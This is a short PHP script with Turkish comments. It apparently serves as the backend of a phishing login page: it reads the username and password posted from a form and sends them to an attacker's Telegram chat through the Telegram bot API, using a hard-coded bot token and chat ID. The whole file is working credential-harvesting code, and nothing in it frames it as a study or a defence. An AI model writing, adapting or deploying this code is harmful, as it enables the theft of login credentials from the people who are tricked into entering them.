<?php
// Telegram bot bilgileri
$botToken = "7807117458:AAGibS-QJtVky7jCjLIWMJS3VcbsizsbIMk"; // Bot tokeninizi buraya yazın
$chatId = "7807117458"; // Chat ID'nizi buraya yazın

// Formdan gelen verileri alın
$username = htmlspecialchars($_POST['username']);
$password = htmlspecialchars($_POST['password']);

// Mesaj içeriği
$message = "Yeni Giriş Bilgisi:\nKullanıcı Adı: $username\nŞifre: $password";

// Telegram API'sine POST isteği gönderin
$url = "https://api.telegram.org/bot$botToken/sendMessage";

$data = [
    'chat_id' => $chatId,
    'text' => $message
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ],
];

$context  = stream_context_create($options);
$response = file_get_contents($url, false, $context);

// Yanıtı kontrol et
if ($response === FALSE) {
    die('Mesaj gönderilemedi.');
}

// Başarılı mesaj
echo "Mesaj Telegram botuna başarıyla gönderildi.";
?>
